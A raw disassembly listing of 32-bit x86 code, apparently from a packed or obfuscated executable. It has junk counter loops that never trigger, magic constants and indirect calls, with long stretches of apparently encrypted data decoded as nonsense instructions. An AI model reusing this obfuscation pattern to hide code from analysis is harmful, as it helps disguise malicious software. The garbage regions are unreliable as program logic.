  409b7f:	and    DWORD PTR ds:0x4336a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433773
  409b98:	and    edx,DWORD PTR ds:0x433657
  409b9e:	mov    DWORD PTR ds:0x433773,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4336af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4336af,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x4336af,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4336af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4336af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4336af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4336af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4336af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4336a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4336a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4336a3,edi
  409c26:	cmp    DWORD PTR ds:0x4336a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4336a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43385d
  409c45:	push   0x433867
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   esi,eax,0x65a72c2b
  409c81:	out    dx,al
  409c82:	jl     0x409d00
  409c84:	retf   0x7c79
  409c87:	jl     0x409c11
  409c89:	neg    DWORD PTR [eax]
  409c8b:	push   0xda9a57c0
  409c90:	jmp    0x2a52:0xaee237e9
  409c97:	push   esi
  409c98:	mov    DWORD PTR ss:[edx-0x22],ecx
  409c9c:	lods   al,BYTE PTR ds:[esi]
  409c9d:	in     al,0x13
  409c9f:	icebp  
  409ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ca1:	sbb    eax,0x3e70b98d
  409ca6:	dec    esi
  409ca7:	cmovns eax,DWORD PTR [edx+0x4156d900]
  409cae:	push   esp
  409caf:	and    eax,0x902379d3
  409cb4:	inc    eax
  409cb5:	sbb    bl,BYTE PTR [edi+0x40eaa271]
  409cbb:	loopne 0x409d31
  409cbd:	shl    DWORD PTR [ebp+0x57],cl
  409cc0:	cmp    al,0xf0
  409cc2:	and    BYTE PTR cs:[edi+0x30],ah
  409cc6:	push   ebx
  409cc7:	mov    dh,0x7a
  409cc9:	mov    esp,0x51bef3ea
  409cce:	hlt    
  409ccf:	dec    edi
  409cd0:	popa   
  409cd1:	and    ebp,0x75
  409cd4:	adc    edi,DWORD PTR [ecx]
  409cd6:	xchg   ebx,eax
  409cd7:	lahf   
  409cd8:	dec    ebp
  409cd9:	adc    eax,0x6ce2a992
  409cde:	lods   al,BYTE PTR ds:[esi]
  409cdf:	add    al,0x3c
  409ce1:	sbb    DWORD PTR [ebx+esi*1-0x44040d87],esi
  409ce8:	pop    ds
  409ce9:	jo     0x409d25
  409ceb:	jge    0x409cf7
  409ced:	cmp    esi,DWORD PTR [esp+eax*8]
  409cf0:	pop    es
  409cf1:	lods   eax,DWORD PTR ds:[esi]
  409cf2:	and    esp,DWORD PTR [ebp-0x52f764fb]
  409cf8:	mov    ds:0x221ae032,eax
  409cfd:	push   ecx
  409cfe:	in     al,0x71
  409d00:	push   ebx
  409d01:	pop    ecx
  409d02:	ds pop esi
  409d04:	mov    esi,0xea96fd58
  409d09:	test   DWORD PTR [eax],ecx
  409d0b:	xchg   DWORD PTR [ecx+0x33],ebp
  409d0e:	aaa    
  409d0f:	imul   esp,DWORD PTR ds:0x9a908a95,0x7b6ea196
  409d19:	out    0x85,al
  409d1b:	rcl    BYTE PTR [ecx-0x424ddbce],1
  409d21:	out    dx,al
  409d22:	mov    cl,0xd3
  409d24:	fimul  WORD PTR [ecx+0x7151a771]
  409d2a:	xchg   esi,eax
  409d2b:	sbb    dl,bl
  409d2d:	sbb    BYTE PTR [ecx],0x10
  409d30:	enter  0x6b2a,0x52
  409d34:	xchg   esi,eax
  409d35:	and    bh,BYTE PTR [edi]
  409d37:	ins    BYTE PTR es:[edi],dx
  409d38:	aam    0xf
  409d3a:	fisubr DWORD PTR [eax+0x56]
  409d3d:	mov    eax,0xf8d93b04
  409d42:	and    BYTE PTR fs:[ebx],dl
  409d45:	(bad)  
  409d46:	pop    ss
  409d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d48:	out    0xd2,eax
  409d4a:	push   edi
  409d4b:	pop    ss
  409d4c:	adc    eax,0x216c649c
  409d51:	sub    DWORD PTR [ecx+0x10175fe4],0x475a3ec6
  409d5b:	inc    eax
  409d5c:	sub    al,0xcf
  409d5e:	iret   
  409d5f:	adc    al,0xa7
  409d61:	leave  
  409d62:	fs jo  0x409db0
  409d65:	jl     0x409cfe
  409d67:	imul   edx,edx,0x3cc20f66
  409d6d:	xor    bh,BYTE PTR [ebx+0x53d72794]
  409d73:	and    al,0x6f
  409d75:	ss pop edi
  409d77:	(bad)  
  409d79:	and    DWORD PTR [ebx-0x18],0xb4f99ff8
  409d80:	and    DWORD PTR [edx-0x27c79346],ebp
  409d86:	adc    BYTE PTR [esi-0x3014df7e],ch
  409d8c:	push   eax
  409d8d:	mov    eax,0x74f5a1b1
  409d92:	mov    dl,0xac
  409d94:	fiadd  WORD PTR [ecx-0x79]
  409d97:	in     eax,dx
  409d98:	mov    ecx,?
  409d9a:	cmp    cl,BYTE PTR [edx-0x5d]
  409d9d:	fwait
  409d9e:	push   cs
  409d9f:	adc    eax,DWORD PTR [edx-0x72]
  409da2:	stos   BYTE PTR es:[edi],al
  409da3:	cs or  al,0xab
  409da6:	push   eax
  409da7:	aam    0x8f
  409da9:	push   es
  409daa:	and    bh,BYTE PTR [eax+0x5c]
  409dad:	(bad)  
  409dae:	sbb    dh,BYTE PTR [ebx]
  409db0:	push   ecx
  409db1:	mov    al,0x5f
  409db3:	adc    BYTE PTR [esi],bl
  409db5:	fucomip st,st(6)
  409db7:	jl     0x409d67
  409db9:	popa   
  409dba:	cmp    al,BYTE PTR [ebp-0xe922df9]
  409dc0:	and    dh,al
  409dc2:	mov    dl,0x51
  409dc4:	jns    0x409d62
  409dc6:	loop   0x409d4c
  409dc8:	mov    eax,ds:0xd7135e44
  409dcd:	mov    edx,0xfcfd43c4
  409dd2:	jno    0x409dc3
  409dd4:	cmp    esi,DWORD PTR [ecx]
  409dd6:	jp     0x409e53
  409dd8:	in     al,dx
  409dd9:	jno    0x409e59
  409ddb:	dec    ebx
  409ddc:	cld    
  409ddd:	cmp    DWORD PTR [ebp+0x16],edi
  409de0:	in     eax,dx
  409de1:	xchg   ebx,eax
  409de2:	pop    esi
  409de3:	sub    bl,bh
  409de5:	sub    ah,dl
  409de7:	inc    esp
  409de8:	sub    bl,BYTE PTR [ebx-0x52b26e03]
  409dee:	pop    eax
  409def:	mov    dh,0x1e
  409df1:	retf   
  409df2:	or     ch,bl
  409df4:	cs mov cl,0x53
  409df7:	pop    ds
  409df8:	mov    ebx,DWORD PTR [edi-0x1379ecb1]
  409dfe:	push   esp
  409dff:	mov    eax,ds:0x3c341a1f
  409e04:	mov    eax,0xad932851
  409e09:	inc    ebx
  409e0a:	xchg   ebx,eax
  409e0b:	xchg   ebp,eax
  409e0c:	dec    ebx
  409e0d:	push   ebx
  409e0e:	shl    BYTE PTR ds:[ebp+0x4c],0xce
  409e13:	outs   dx,DWORD PTR ds:[esi]
  409e14:	pop    eax
  409e15:	pop    edi
  409e16:	into   
  409e17:	lods   eax,DWORD PTR ds:[esi]
  409e18:	int    0x47
  409e1a:	les    esi,FWORD PTR [edx+0xc]
  409e1d:	test   DWORD PTR [ecx-0x445047b0],esi
  409e23:	clc    
  409e24:	push   eax
  409e25:	mov    edi,0xe4c0de13
  409e2a:	inc    ebp
  409e2b:	fcmovu st,st(2)
  409e2d:	jnp    0x409e16
  409e2f:	add    dh,0x3e
  409e32:	dec    edx
  409e33:	sbb    ah,BYTE PTR [edx]
  409e35:	pop    esi
  409e36:	push   ecx
  409e37:	push   ebp
  409e38:	outs   dx,DWORD PTR ds:[esi]
  409e39:	mov    dl,0x53
  409e3b:	jbe    0x409e54
  409e3d:	lds    esp,FWORD PTR ds:0x8c8e4e57
  409e43:	aas    
  409e44:	and    al,0xaa
  409e46:	xor    eax,0x4e3456d
  409e4b:	retf   0x35ce
  409e4e:	scas   al,BYTE PTR es:[edi]
  409e4f:	shl    BYTE PTR [ebp+0x76c6a16b],cl
  409e55:	add    al,0xa
  409e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e58:	mov    eax,0xd5ecaf80
  409e5d:	cmc    
  409e5e:	or     BYTE PTR ds:0x5e59539f,dh
  409e64:	repnz arpl WORD PTR [ebp-0x40eb01e],bx
  409e6b:	and    esp,DWORD PTR [esp+edi*2-0x3893a63c]
  409e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e73:	in     al,0xba
  409e75:	push   cs
  409e76:	xchg   esi,eax
  409e77:	push   0x75
  409e79:	and    eax,0xc73b8a46
  409e7e:	pop    ecx
  409e7f:	add    eax,0x33299e9b
  409e84:	test   DWORD PTR [edi+0x30d45550],ebp
  409e8a:	xlat   BYTE PTR ds:[ebx]
  409e8b:	sub    DWORD PTR [ebx-0x56],ebp
  409e8e:	in     al,dx
  409e8f:	(bad)
  409e92:	xor    edi,esi
  409e94:	xor    DWORD PTR [esi+0x12b08d9f],0x8
  409e9b:	cli    
  409e9c:	and    eax,0x287b1264
  409ea1:	(bad)  [esi+0x2b8e374f]
  409ea7:	adc    eax,0x4e2343e4
  409eac:	fiadd  DWORD PTR [ebp+0x1b]
  409eaf:	dec    ebx
  409eb0:	xchg   DWORD PTR [edi],edi
  409eb2:	inc    ebx
  409eb3:	pop    ds
  409eb4:	pop    edx
  409eb5:	xchg   ebp,eax
  409eb6:	div    BYTE PTR [esi+0x45]
  409eb9:	pop    edx
  409eba:	pop    esi
  409ebb:	mov    ecx,0x4811b57
  409ec0:	dec    edi
  409ec1:	mov    ebx,0xa2bb56b4
  409ec6:	int3   
  409ec7:	pusha  
  409ec8:	and    dh,bh
  409eca:	add    DWORD PTR [ecx-0x16bca96],ebx
  409ed0:	mov    ecx,0x7044e541
  409ed5:	arpl   si,bp
  409ed7:	sti    
  409ed8:	rcr    DWORD PTR [ecx],0xef
  409edb:	shr    DWORD PTR [ebx-0x5d177835],0xb1
  409ee2:	pop    eax
  409ee3:	jne    0x409e7a
  409ee5:	push   edx
  409ee6:	jmp    0xbdbcc228
  409eeb:	sbb    al,0xf3
  409eed:	mov    BYTE PTR [edi],dl
  409eef:	sbb    esp,DWORD PTR [ebp-0x72]
  409ef2:	jae    0x409f25
  409ef4:	xchg   ebx,eax
  409ef5:	je     0x409f57
  409ef7:	retf   0xbe78
  409efa:	pop    ds
  409efb:	or     bl,BYTE PTR [ebp-0x13c355d7]
  409f01:	and    eax,0x4584cf39
  409f06:	pop    esi
  409f07:	inc    ebp
  409f08:	adc    eax,edi
  409f0a:	test   ebp,ecx
  409f0c:	sbb    DWORD PTR [eax-0x71],esp
  409f0f:	pop    ebx
  409f10:	mov    dh,0xd6
  409f12:	xor    eax,0x1a2c8c2d
  409f17:	lahf   
  409f18:	jns    0x409f19
  409f1a:	add    eax,0xdd98fe69
  409f1f:	lods   eax,DWORD PTR ds:[esi]
  409f20:	add    DWORD PTR [edi],0xffffff89
  409f23:	inc    ebx
  409f24:	adc    al,0xb1
  409f26:	in     eax,dx
  409f27:	clc    
  409f28:	inc    edx
  409f29:	push   ds
  409f2a:	sbb    dl,bl
  409f2c:	ds (bad) 
  409f2e:	out    0x44,al
  409f30:	bts    DWORD PTR [edi+0x77],edi
  409f34:	mov    dh,0xea
  409f36:	mov    esp,0x5f2490a7
  409f3b:	xor    BYTE PTR [eax-0x49],dl
  409f3e:	addr16 ret 0x9195
  409f42:	ror    BYTE PTR [esi-0x3d],0xbd
  409f46:	jmp    0x5115fbf1
  409f4b:	mov    gs,WORD PTR [edx]
  409f4d:	sub    esp,edx
  409f4f:	cli    
  409f50:	test   al,0x70
  409f52:	cmp    al,0xbd
  409f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f55:	mov    edx,0x48b13a9d
  409f5a:	cmp    ch,BYTE PTR [ecx+eiz*2]
  409f5d:	cmp    ah,bh
  409f5f:	add    dh,bh
  409f61:	xchg   esi,eax
  409f62:	call   0xd47fc262
  409f67:	adc    DWORD PTR [ebx],ebp
  409f69:	mov    esi,0x5be1bc72
  409f6e:	idiv   ch
  409f70:	mov    bl,0xb5
  409f72:	(bad)  
  409f74:	mov    bl,0xa7
  409f76:	adc    DWORD PTR [edi+0x72e79431],eax
  409f7c:	mov    ch,0xde
  409f7e:	test   eax,0x4caef668
  409f83:	xchg   DWORD PTR ds:0xecc968d1,edx
  409f89:	mov    BYTE PTR [ebx-0x3467bb02],al
  409f8f:	sub    DWORD PTR ds:0xb8677926,edx
  409f95:	cmp    ebp,DWORD PTR [edi]
  409f97:	shl    BYTE PTR [eax-0x4bb844c5],0xf9
  409f9e:	fsubr  QWORD PTR [esi-0x22]
  409fa1:	pop    edx
  409fa2:	xor    ah,BYTE PTR [eax]
  409fa4:	add    eax,0xe4790aea
  409fa9:	scas   eax,DWORD PTR es:[edi]
  409faa:	cmp    edi,esp
  409fac:	jbe    0x409f32
  409fae:	ins    DWORD PTR es:[edi],dx
  409faf:	pop    ds
  409fb0:	jge    0x409feb
  409fb2:	add    BYTE PTR [ebx],dl
  409fb4:	xlat   BYTE PTR ds:[ebx]
  409fb5:	cli    
  409fb6:	mov    esi,0xe7e41a54
  409fbb:	das    
  409fbc:	mov    BYTE PTR [ebp-0x20],ch
  409fbf:	out    dx,eax
  409fc0:	adc    ch,ch
  409fc2:	pushf  
  409fc3:	jnp    0x409ff8
  409fc5:	pop    es
  409fc6:	mov    ebx,eax
  409fc8:	xchg   ebp,eax
  409fc9:	enter  0xcfd3,0xb
  409fcd:	iret   
  409fce:	aam    0x7b
  409fd0:	mov    DWORD PTR [edi+edi*2-0x7079c9bc],ebx
  409fd7:	sahf   
  409fd8:	lods   al,BYTE PTR ds:[esi]
  409fd9:	cs dec edx
  409fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fdc:	cli    
  409fdd:	pop    ecx
  409fde:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  409fe5:	and    DWORD PTR ds:0x433723,0x0
  409fef:	jmp    0x40a001
  409ff4:	mov    edx,DWORD PTR ds:0x433723
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433723,edx
  40a001:	cmp    DWORD PTR ds:0x433723,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433723,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433773
  40a040:	adc    edx,DWORD PTR ds:0x43372b
  40a046:	mov    DWORD PTR ds:0x433773,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433657,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4336df
  40a075:	xor    DWORD PTR ds:0x4336b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433653,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43376b
  40a094:	xor    DWORD PTR ds:0x43375b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	mov    edi,0x33ce09c1
  40a0b0:	jmp    0x7c7c:0x79ca7c7c
  40a0b7:	call   0x5217eabc
  40a0bc:	inc    edx
  40a0bd:	out    dx,eax
  40a0be:	or     DWORD PTR [eax-0x3f8d4cf6],edi
  40a0c4:	sub    al,0x2
  40a0c6:	jae    0x40a0ce
  40a0c8:	dec    ebp
  40a0c9:	mov    al,ds:0x657f5a71
  40a0ce:	lods   al,BYTE PTR ds:[esi]
  40a0cf:	mov    edx,0x1084f12f
  40a0d4:	xor    bl,ch
  40a0d6:	ret    0xa959
  40a0d9:	inc    esi
  40a0da:	add    DWORD PTR [edi+0x56],esi
  40a0dd:	inc    ecx
  40a0de:	iret   
  40a0df:	fdiv   QWORD PTR [esi]
  40a0e1:	je     0x40a0d8
  40a0e3:	shl    DWORD PTR [ecx+ebp*8-0x6f],0xf7
  40a0e8:	xchg   ebx,eax
  40a0e9:	sbb    eax,0xe5fdf871
  40a0ee:	add    BYTE PTR [ebp+0x17b9ea7],dh
  40a0f4:	fdivr  DWORD PTR [esi-0x56d13cc8]
  40a0fa:	(bad)  
  40a0fb:	mov    ebx,DWORD PTR [edi-0x3669dd9d]
  40a101:	dec    ebx
  40a102:	dec    esi
  40a103:	jb     0x40a142
  40a105:	add    al,0xc2
  40a107:	jle    0x40a089
  40a109:	or     eax,0xb69e5329
  40a10e:	ins    BYTE PTR es:[edi],dx
  40a10f:	out    0x25,eax
  40a111:	sbb    eax,0xfc3ea2ba
  40a116:	mov    ecx,DWORD PTR [esi]
  40a118:	imul   ecx,DWORD PTR [edx+ebp*4-0x1fe041b3],0xedfd910e
  40a123:	fstp   TBYTE PTR [eax]
  40a125:	cmp    eax,0xc0bc4439
  40a12a:	push   ecx
  40a12b:	sub    al,dh
  40a12d:	cmp    bh,ch
  40a12f:	aam    0xc9
  40a131:	pushf  
  40a132:	or     al,0x51
  40a134:	jae    0x40a0b6
  40a136:	inc    eax
  40a137:	push   ds
  40a138:	mov    eax,ds:0x309f7ac3
  40a13d:	inc    ebx
  40a13e:	xor    BYTE PTR [edi-0x48e92a12],bh
  40a144:	imul   esp,DWORD PTR gs:[ecx*4-0x51def9c4],0xffffff80
  40a14d:	nop
  40a14e:	dec    edi
  40a14f:	xchg   BYTE PTR [ebx],dl
  40a151:	sbb    dl,dh
  40a153:	mov    esi,0x2c3b9278
  40a158:	pop    edx
  40a159:	adc    BYTE PTR [eax+edx*8-0x17244b5b],dh
  40a160:	(bad)  
  40a161:	push   cs
  40a162:	pushf  
  40a163:	sub    ch,ah
  40a165:	and    al,0x42
  40a167:	push   edx
  40a168:	adc    ah,BYTE PTR [esi+0x70]
  40a16b:	xchg   edi,eax
  40a16c:	in     al,0x17
  40a16e:	push   0xffffffb0
  40a170:	lds    esp,FWORD PTR [eax+0x66aa2b1f]
  40a176:	and    eax,0xfbdc9282
  40a17b:	jbe    0x40a127
  40a17d:	xchg   esi,eax
  40a17e:	jae    0x40a1ff
  40a180:	fcmovnu st,st(1)
  40a182:	dec    ebx
  40a183:	sub    cl,BYTE PTR [ebx-0x13c4e432]
  40a189:	jmp    DWORD PTR [ecx]
  40a18b:	outs   dx,DWORD PTR ds:[esi]
  40a18c:	call   0xefddee45
  40a191:	inc    ebx
  40a193:	jecxz  0x40a15b
  40a195:	(bad)
  40a198:	(bad)  
  40a199:	in     eax,0x2a
  40a19b:	scas   eax,DWORD PTR es:[edi]
  40a19c:	mov    eax,ds:0x5055e5be
  40a1a1:	cmp    eax,edi
  40a1a3:	fs pushf 
  40a1a5:	gs jmp 0xe62c:0x21310c09
  40a1ad:	pop    esi
  40a1ae:	pop    es
  40a1af:	mov    BYTE PTR ds:0x9aa5def3,al
  40a1b5:	hlt    
  40a1b6:	pop    edx
  40a1b7:	imul   eax,DWORD PTR [ecx],0x18
  40a1ba:	ja     0x40a16a
  40a1bc:	and    al,0x11
  40a1be:	popf   
  40a1bf:	xor    edi,DWORD PTR [ebx+0x5e]
  40a1c2:	sbb    cl,ah
  40a1c4:	test   eax,0x5732d6ba
  40a1c9:	and    al,0x23
  40a1cb:	or     DWORD PTR [ecx],edi
  40a1cd:	stc    
  40a1ce:	(bad)  
  40a1cf:	data16 daa 
  40a1d1:	pop    esi
  40a1d2:	cmp    al,0x54
  40a1d4:	inc    esp
  40a1d5:	enter  0x5aef,0x5e
  40a1d9:	out    0x5c,al
  40a1db:	mov    ds:0x3f7390d9,eax
  40a1e0:	mov    eax,0x16e1e88a
  40a1e5:	lea    esp,[eax+0x2d240084]
  40a1eb:	pop    ecx
  40a1ec:	sbb    eax,0xb1ac775d
  40a1f1:	add    al,0xe6
  40a1f3:	and    DWORD PTR [edi-0x27ce9d41],edi
  40a1f9:	dec    esi
  40a1fa:	add    DWORD PTR [ebp+0x103a8211],0x45
  40a201:	icebp  
  40a202:	retf   0x4b43
  40a205:	imul   ch
  40a207:	cwde   
  40a208:	ja     0x40a282
  40a20a:	ret    
  40a20b:	hlt    
  40a20c:	adc    ch,BYTE PTR [ebx-0x61]
  40a20f:	sti    
  40a210:	fild   QWORD PTR [ebx-0xd90f378]
  40a216:	ins    BYTE PTR es:[edi],dx
  40a217:	and    ecx,esp
  40a219:	mov    ds:0xd953067c,al
  40a21e:	test   DWORD PTR [ecx-0x7773c77a],esi
  40a224:	mov    edi,0x7258e21a
  40a229:	jae    0x40a2a0
  40a22b:	retf   
  40a22c:	shr    DWORD PTR [esi],1
  40a22e:	into   
  40a22f:	xor    dh,BYTE PTR [edi+ebp*2]
  40a232:	xchg   ebp,eax
  40a233:	js     0x40a267
  40a235:	imul   edx,DWORD PTR [ebx+0x7c315527],0x13
  40a23c:	daa    
  40a23d:	in     al,0xb9
  40a23f:	jbe    0x40a263
  40a241:	xchg   ebp,eax
  40a242:	add    DWORD PTR [esi],ebp
  40a244:	inc    ebp
  40a245:	loope  0x40a211
  40a247:	fidiv  DWORD PTR [eax+0x49]
  40a24a:	lds    ebp,FWORD PTR [ebp-0x11]
  40a24d:	and    BYTE PTR [eax-0x79],al
  40a250:	mov    edx,eax
  40a252:	inc    ecx
  40a253:	dec    eax
  40a254:	sub    ch,dh
  40a256:	out    dx,al
  40a257:	dec    ebx
  40a258:	sar    al,0x88
  40a25b:	jns    0x40a272
  40a25d:	mov    ?,WORD PTR [eax]
  40a25f:	pop    esp
  40a260:	sbb    BYTE PTR [eax-0x23],ah
  40a263:	add    DWORD PTR [eax+0x5d650580],esp
  40a269:	jmp    0x40a2e5
  40a26b:	adc    DWORD PTR [ecx+0x65],edx
  40a26e:	inc    edx
  40a26f:	push   eax
  40a270:	stc    
  40a271:	ja     0x40a2ad
  40a273:	mov    al,0xe
  40a276:	stos   BYTE PTR es:[edi],al
  40a277:	iret   
  40a278:	icebp  
  40a279:	mov    dl,0x3
  40a27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a27c:	loop   0x40a2f1
  40a27e:	fcom   st(6)
  40a280:	inc    ecx
  40a281:	(bad)  
  40a282:	cmc    
  40a283:	pop    ds
  40a284:	sub    eax,edi
  40a286:	dec    esi
  40a287:	outs   dx,DWORD PTR ds:[esi]
  40a288:	mov    WORD PTR [edi+eiz*2-0x54a0d668],ds
  40a28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a290:	arpl   WORD PTR [ebx-0x17],cx
  40a293:	icebp  
  40a294:	mov    al,ds:0x8cdd88a3
  40a299:	lahf   
  40a29a:	mov    dl,0xaa
  40a29c:	mov    ds:0xbaaf59a5,eax
  40a2a1:	test   ecx,0xfd687d13
  40a2a7:	push   ecx
  40a2a8:	repz dec edx
  40a2aa:	add    ch,BYTE PTR [esi]
  40a2ac:	push   0x28
  40a2ae:	enter  0x1780,0x5e
  40a2b2:	inc    edi
  40a2b3:	and    BYTE PTR [edi+0x279dd599],dh
  40a2b9:	sub    BYTE PTR [ebx-0x62],ah
  40a2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bd:	ret    0x251c
  40a2c0:	jae    0x40a287
  40a2c2:	fist   WORD PTR [eax+eiz*2]
  40a2c5:	xor    esp,ebp
  40a2c7:	ja     0x40a2b6
  40a2c9:	sbb    BYTE PTR [ecx],al
  40a2cb:	out    dx,al
  40a2cc:	or     DWORD PTR [ecx-0x434d30e2],ebx
  40a2d2:	or     edx,0xffffffbc
  40a2d5:	imul   ebp,esi,0xa5ea6199
  40a2db:	or     BYTE PTR [ebx],dh
  40a2dd:	pop    ss
  40a2de:	aas    
  40a2df:	xor    eax,DWORD PTR [ecx+0x9e122c4]
  40a2e5:	retf   
  40a2e6:	test   DWORD PTR [eax-0x16e18f5e],esp
  40a2ec:	dec    edx
  40a2ed:	jg     0x40a29b
  40a2ef:	push   cs
  40a2f0:	idiv   BYTE PTR [ecx]
  40a2f2:	fs (bad) 
  40a2f4:	mov    bh,0x9
  40a2f6:	mov    eax,0xdc58caef
  40a2fb:	cmp    bl,dh
  40a2fd:	inc    ecx
  40a2fe:	enter  0xcfd5,0x66
  40a302:	xor    eax,DWORD PTR [eax-0x64ceff46]
  40a308:	test   eax,0xfbbe9439
  40a30d:	test   dh,bh
  40a30f:	push   ebp
  40a310:	jno    0x40a33d
  40a312:	ror    BYTE PTR [esi+0xa],1
  40a315:	jmp    0x40a390
  40a317:	dec    esp
  40a318:	pusha  
  40a319:	push   edi
  40a31a:	mov    ebp,0xa6b73b6
  40a31f:	mov    BYTE PTR [edi],bh
  40a321:	stc    
  40a322:	repnz test BYTE PTR [edi-0x2],0xc3
  40a327:	sub    eax,0xcc707ed8
  40a32c:	ja     0x40a39f
  40a32e:	mov    edx,DWORD PTR [edi+eiz*1+0x4c]
  40a332:	fcom   DWORD PTR [edx]
  40a334:	icebp  
  40a335:	(bad)  
  40a336:	rol    bh,1
  40a338:	sbb    eax,0x86ef9375
  40a33d:	pop    ecx
  40a33e:	adc    BYTE PTR [edi],0xdf
  40a341:	pop    ebp
  40a342:	inc    eax
  40a343:	fdivp  st(0),st
  40a345:	iret   
  40a346:	outs   dx,BYTE PTR ds:[esi]
  40a347:	xor    DWORD PTR [esi+0x3b],0x59c818c8
  40a34e:	jecxz  0x40a35d
  40a350:	lods   al,BYTE PTR ds:[esi]
  40a351:	and    cl,BYTE PTR [edx-0x76]
  40a354:	loopne 0x40a2ea
  40a356:	aas    
  40a357:	iret   
  40a358:	add    eax,0x517f4d64
  40a35d:	pop    ds
  40a35e:	aad    0xe
  40a360:	fadd   QWORD PTR [edx]
  40a362:	lea    esi,[ebp+0x14]
  40a365:	loope  0x40a2fb
  40a367:	cld    
  40a368:	inc    ebx
  40a369:	sbb    esp,DWORD PTR [edi]
  40a36b:	push   ecx
  40a36c:	hlt    
  40a36d:	push   esp
  40a36e:	popa   
  40a36f:	dec    edx
  40a370:	inc    dh
  40a372:	inc    esp
  40a373:	sbb    bh,BYTE PTR [eax+0x248b070f]
  40a379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a37a:	(bad)  
  40a37c:	scas   al,BYTE PTR es:[edi]
  40a37d:	shl    ebp,1
  40a37f:	push   edi
  40a380:	sbb    ecx,DWORD PTR ds:0x590a9ca8
  40a386:	out    dx,eax
  40a387:	cdq    
  40a388:	ret    0xea88
  40a38b:	inc    ebp
  40a38c:	in     al,dx
  40a38d:	pop    edx
  40a38e:	test   ah,ch
  40a390:	mov    bh,0xd
  40a392:	pusha  
  40a393:	or     ch,ah
  40a395:	mov    eax,0xe65c79e1
  40a39a:	adc    bl,cl
  40a39c:	adc    eax,DWORD PTR [ecx-0x6f8d2892]
  40a3a2:	jno    0x40a326
  40a3a4:	cmp    DWORD PTR [edi-0x7770b558],ebx
  40a3aa:	mov    esi,0xa6222c27
  40a3af:	add    ebp,ebx
  40a3b1:	in     al,dx
  40a3b2:	scas   eax,DWORD PTR es:[edi]
  40a3b3:	jle    0x40a3b7
  40a3b5:	sbb    al,0x6c
  40a3b7:	push   eax
  40a3b8:	mov    ebx,0x1b2e642d
  40a3bd:	xor    DWORD PTR [eax],0xbceff2bf
  40a3c3:	inc    esp
  40a3c4:	sbb    DWORD PTR [edx],esi
  40a3c6:	lods   eax,DWORD PTR ds:[esi]
  40a3c7:	and    ebp,edx
  40a3c9:	push   edx
  40a3ca:	push   eax
  40a3cb:	popaw  
  40a3cd:	cmc    
  40a3ce:	scas   al,BYTE PTR es:[edi]
  40a3cf:	and    bh,BYTE PTR [ebp-0xf9f37d2]
